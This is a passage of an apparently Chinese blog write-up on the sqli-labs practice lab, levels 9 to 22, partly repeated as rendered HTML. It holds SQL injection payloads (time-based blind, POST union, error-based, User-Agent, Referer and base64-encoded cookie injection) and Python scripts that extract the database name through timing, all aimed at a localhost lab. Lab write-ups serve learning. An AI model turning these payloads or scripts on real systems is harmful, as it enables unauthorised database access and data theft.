txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n```\n附上截图\n![1](/img/2018-08-03/1.png)\n##### 第十关\n也是时间盲注，基于双引号，把单引号变成双引号即可\n```\nid=1\" and if(ascii(substr(database(),1,1))>=97,sleep(5),sleep(0)) -- +\n```\n##### 第十一关\n第十一关是基于单引号的post型注入，在f12下可以看到表单是post型以及两个参数`uname`和`passwd`\n![2](/img/2018-08-03/2.png)\npost型注入要勾选上post data，最后不要忘记`submit=Submit`\n![3](/img/2018-08-03/3.png)\n&emsp;&emsp;我在测试时发现我的火狐浏览器的hackbar在post方式下单引号测试excute点击没反应，（对于这个bug真的很迷，也有师兄曾经遇到过），无奈只能切换工具，chrome下的postman，效果也不怎么好，直接换了旧版本的火狐（56.0）\n继续，在passwd后加个单引号直接报错，后面就跟第一关一样了，post表单payload如下\n```\nuname=123&passwd=123' union select 1,database() -- +&submit=Submit\n```\n![4](/img/2018-08-03/4.png)\n##### 第十二关\n基于双引号的post型注入，跟第十一关一样，单引号替换双引号，测试发现报错，少了括号，payload如下\n```\nuname=123&passwd=456\") union select 1,database() -- + &submit=Submit\n```\n![5](/img/2018-08-03/5.png)\n##### 第十三关\npost型基于单引号的双注入，第五关讲过，直接拿第五关的payload\n```\nuname=123&passwd=123') union select count(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a-- + &submit=Submit\n```\n一次没成功就多试几次\n![6](/img/2018-08-03/6.png)\n##### 第十四关\npost型基于双引号的双注入，跟第十三关一样，payload如下\n```\nuname=123&passwd=123\" union select count(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a-- + &submit=Submit\n```\n![7](/img/2018-08-03/7.png)\n##### 第十五关\npost型单引号盲注，测试布尔型\n```\nuname=123&passwd=123' or '1'='1 &submit=Submit\n```\n![8](/img/2018-08-03/8.png)\n测试时间型失败，返回时间异常，经常是几分钟才有有回复，测试失败\n##### 第十六关\npost型双引号盲注和第十五关一样\n```\nuname=123&passwd=123\") or \"1\"=\"1\" -- + &submit=Submit\n```\n![9](/img/2018-08-03/9.png)\n##### 第十七关\n基于错误的更新查询post注入\n**高版本的mysql已经修复了这个bug**\n有兴趣的可以去了解下\n-->[传送门](https://blog.csdn.net/Fly_hps/article/details/79416842)\n-->[传送门](https://blog.csdn.net/u012763794/article/details/51361152)\n-->[传送门](https://www.cnblogs.com/xishaonian/p/6243497.html)\n##### 第十八关\n请求头User-Agent注入（需要正确的用户名和密码），需要抓包，抓包工具burpsuit（不会使用的自行百度）\n先抓包\n![10](/img/2018-08-03/10.png)\n在User-Agent后面加一个单引号\n```\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'\n```\n发现报错，说明可以注入\n![11](/img/2018-08-03/11.png)\n一般这种注入的sql语句都是insert类型，查看index.php的查询关键代码\n```\n$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n```\n因为这种方式注入没有回显，一般是基于时间的insert型盲注，通过判断返回时间来注入\n*user-agent简写成Mozilla/5.0 Firefox/56.0*\n```\nUser-Agent: Mozilla/5.0 Firefox/56.0' or sleep(5) or '\n```\n最后要闭合单引号，不可以注释掉（我也不知道原因π_π）\n5秒后返回正常页面\n![12](/img/2018-08-03/12.png)\n猜测数据库\n```\nUser-Agent: Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),1,1))>97,sleep(5),sleep(0)) or '\n```\n5秒后返回\n![13](/img/2018-08-03/13.png)\n盲注当然是写脚本跑啦,python脚本代码如下，稍微修改了一下之前的代码就可以了\n```\nimport requests\nimport time\n\ntxt1 = \"Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),\"\ntxt2 = \",1))>=\"\ntxt3 = \",1))=\"\ntxt4 = \",sleep(2),sleep(0)) or '\"\nkey = {'uname':'admin','passwd':'admin','submit':'Submit'}\nurl = \"http://localhost/sqli-labs/Less-18/\"\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9):\n\tpayload = txt1+str(i)+txt2+str(num11)+txt4\n\theaders = {'User-Agent': payload}\n\ttime1 = time.time()\n\treq = requests.post(url = url,data =key,headers = headers)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum1 = 1\n\t\t\n\tpayload = txt1+str(i)+txt2+str(num12)+txt4\n\theaders = {'User-Agent': payload}\n\ttime1 = time.time()\n\treq = requests.post(url = url,data =key,headers = headers)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum2 = 1\n\n\tpayload = txt1+str(i)+txt2+str(num13)+txt4\n\theaders = {'User-Agent': payload}\n\ttime1 = time.time()\n\treq = requests.post(url = url,data =key,headers = headers)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum3 = 1\n\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 <=2):\n\t\t\tnum -= 3\n\t\tif((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 <=2):\n\t\t\tnum -= 3\n\t\tif((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n```\n![14](/img/2018-08-03/14.png)\n##### 第十九关\n跟第十八关一样，referer注入，也是insert语句\n修改请求头\n```\nReferer: http://localhost/sqli-labs/Less-19/' or if(ascii(substr((select database()),1,1))>97,sleep(5),sleep(0)) or '\n```\n![15](/img/2018-08-03/15.png)\n5秒后页面返回正常，脚本参考上面的\n##### 第二十关\ncookie注入，这一关要先登录，登陆后有cookie才可以注入\n测试单引号，在cookie后面加一个单引号\n![17](/img/2018-08-03/17.png)\n用`order by`测试有多少列\n```\nCookie: uname=admin' order by 4#\n```\n![18](/img/2018-08-03/18.png)\n查数据库\n```\nCookie: uname=admin' union select 1,2,database() limit 1,1#\n```\n![19](/img/2018-08-03/19.png)\n后面的一样了\n<div style=\"text-align: center\">-------------------------2018-08-10更新-------------------------\n</div>\n\n##### 第二十一关\n用`admin`，`admin`登陆后抓包看到cooie\n```\nCookie: uname=YWRtaW4%3D\n```\nurl解码后`YWRtaW4=`，用base64尝试解码得到`admin`，那么cookie应该就是用了base64加密过的，和第二十关一样，多了base64加密，\n```\nCookie: uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgbGltaXQgMSwxIw%3D%3D\n```\n![21](/img/2018-08-03/21.png)\n##### 第二十二关\n和第二十一关一样，单引号变双引号\n```\nYWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSBsaW1pdCAxLDEj\n```\n\n第一部分\n\n完、","slug":"sqli-labs2","published":1,"mouth":"08","updated":"2020-09-18T03:23:29.284Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhox7000eez8kus3awsn2","content":"<p>sqli-labs上的sql注入学习第二部分，上半部分（1-8）→<a href=\"https://lzy-wi.github.io/2018/07/20/sqli-labs1/\" target=\"_blank\" rel=\"noopener\">sqli-labs的学习记录一</a><br><a id=\"more\"></a></p>\n<h5 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h5><p>&emsp;&emsp;布尔盲注是判断对错，第九关是基于时间的盲注，根据返回时间来判断。比如<code>(ascii(substr(database(),1,1))&gt;=97</code>,我们可以让这个判断语句正确延迟5秒返回，如果错误就正常返回。这里用到一个if函数，if（a,b,c）如果a正确就返回b，否则返回c。<br>所以最终payload为<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>' and if(ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;=<span class=\"hljs-number\">97</span>,sleep(<span class=\"hljs-number\">5</span>),sleep(<span class=\"hljs-number\">0</span>)) -- +</code></pre></p>\n<p>然后跟布尔盲注的方法一样一个一个的判断，时间上会比布尔盲注要多，要节省时间可以降低到2秒或者3秒,脚本基本上是抄第八关的，在判断方式上做了变动，思路不变。<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests\n<span class=\"hljs-keyword\">import</span> time\n\ntxt1 = <span class=\"hljs-string\">\"http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),\"</span>\ntxt2 = <span class=\"hljs-string\">\",1))&gt;=\"</span>\ntxt3 = <span class=\"hljs-string\">\",1))=\"</span>\ntxt4 = <span class=\"hljs-string\">\",sleep(2),sleep(0)) -- +\"</span>\nnum11 = <span class=\"hljs-number\">97</span>\nnum12 = <span class=\"hljs-number\">65</span>\nnum13 = <span class=\"hljs-number\">48</span>\ncode = <span class=\"hljs-string\">''</span>\nnum1 = <span class=\"hljs-number\">0</span>\nnum2 = <span class=\"hljs-number\">0</span>\nnum3 = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">9</span>):\n\turl = txt1+str(i)+txt2+str(num11)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum1 = <span class=\"hljs-number\">1</span>\n\t\t\n\turl = txt1+str(i)+txt2+str(num12)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum2 = <span class=\"hljs-number\">1</span>\n\n\turl = txt1+str(i)+txt2+str(num13)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum3 = <span class=\"hljs-number\">1</span>\n\n\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">1</span>):\n\t\tnum = <span class=\"hljs-number\">97</span>\n\t\tnum += <span class=\"hljs-number\">13</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">7</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &lt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>((num == <span class=\"hljs-number\">106</span>) <span class=\"hljs-keyword\">or</span> (num == <span class=\"hljs-number\">119</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">4</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">3</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num2 == <span class=\"hljs-number\">1</span>):\n\t\tnum = <span class=\"hljs-number\">65</span>\n\t\tnum += <span class=\"hljs-number\">13</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">7</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &lt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>((num == <span class=\"hljs-number\">74</span>) <span class=\"hljs-keyword\">or</span> (num == <span class=\"hljs-number\">87</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">4</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">3</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num2 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num3 == <span class=\"hljs-number\">1</span>):\n\t\tnum =<span class=\"hljs-number\">48</span>\n\t\tnum += <span class=\"hljs-number\">5</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">5</span>\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span></code></pre></p>\n<p>附上截图<br><img src=\"/img/2018-08-03/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"></p>\n<h5 id=\"第十关\"><a href=\"#第十关\" class=\"headerlink\" title=\"第十关\"></a>第十关</h5><p>也是时间盲注，基于双引号，把单引号变成双引号即可<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">id</span>=1\" <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(database(),1,1))&gt;=97,sleep(5),sleep(0)) -- +</code></pre></p>\n<h5 id=\"第十一关\"><a href=\"#第十一关\" class=\"headerlink\" title=\"第十一关\"></a>第十一关</h5><p>第十一关是基于单引号的post型注入，在f12下可以看到表单是post型以及两个参数<code>uname</code>和<code>passwd</code><br><img src=\"/img/2018-08-03/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>post型注入要勾选上post data，最后不要忘记<code>submit=Submit</code><br><img src=\"/img/2018-08-03/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>&emsp;&emsp;我在测试时发现我的火狐浏览器的hackbar在post方式下单引号测试excute点击没反应，（对于这个bug真的很迷，也有师兄曾经遇到过），无奈只能切换工具，chrome下的postman，效果也不怎么好，直接换了旧版本的火狐（56.0）<br>继续，在passwd后加个单引号直接报错，后面就跟第一关一样了，post表单payload如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">uname</span>=123&amp;passwd=123' union select 1,database() -- +&amp;<span class=\"hljs-attribute\">submit</span>=Submit</code></pre></p>\n<p><img src=\"/img/2018-08-03/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"></p>\n<h5 id=\"第十二关\"><a href=\"#第十二关\" class=\"headerlink\" title=\"第十二关\"></a>第十二关</h5><p>基于双引号的post型注入，跟第十一关一样，单引号替换双引号，测试发现报错，少了括号，payload如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">uname</span>=123&amp;passwd=456\") union select 1,database() -- + &amp;<span class=\"hljs-attribute\">submit</span>=Submit</code></pre></p>\n<p><img src=\"/img/2018-08-03/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"></p>\n<h5 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h5><p>post型基于单引号的双注入，第五关讲过，直接拿第五关的payload<br><pre><code class=\"hljs undefined\">uname=123&amp;passwd=123') union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">count</span>(*),<span class=\"hljs-keyword\">concat_ws</span>(<span class=\"hljs-string\">':'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()),<span class=\"hljs-keyword\">floor</span>(<span class=\"hljs-keyword\">rand</span>()*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">as</span> a <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> a<span class=\"hljs-comment\">-- + &amp;submit=Submit</span></code></pre></p>\n<p>一次没成功就多试几次<br><img src=\"/img/2018-08-03/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"></p>\n<h5 id=\"第十四关\"><a href=\"#第十四关\" class=\"headerlink\" title=\"第十四关\"></a>第十四关</h5><p>post型基于双引号的双注入，跟第十三关一样，payload如下<br><pre><code class=\"hljs undefined\">uname=123&amp;passwd=123\" union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">count</span>(*),<span class=\"hljs-keyword\">concat_ws</span>(<span class=\"hljs-string\">':'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()),<span class=\"hljs-keyword\">floor</span>(<span class=\"hljs-keyword\">rand</span>()*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">as</span> a <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> a<span class=\"hljs-comment\">-- + &amp;submit=Submit</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"></p>\n<h5 id=\"第十五关\"><a href=\"#第十五关\" class=\"headerlink\" title=\"第十五关\"></a>第十五关</h5><p>post型单引号盲注，测试布尔型<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">uname</span>=<span class=\"hljs-number\">123</span>&amp;passwd=<span class=\"hljs-number\">123</span><span class=\"hljs-string\">' or '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">1</span> 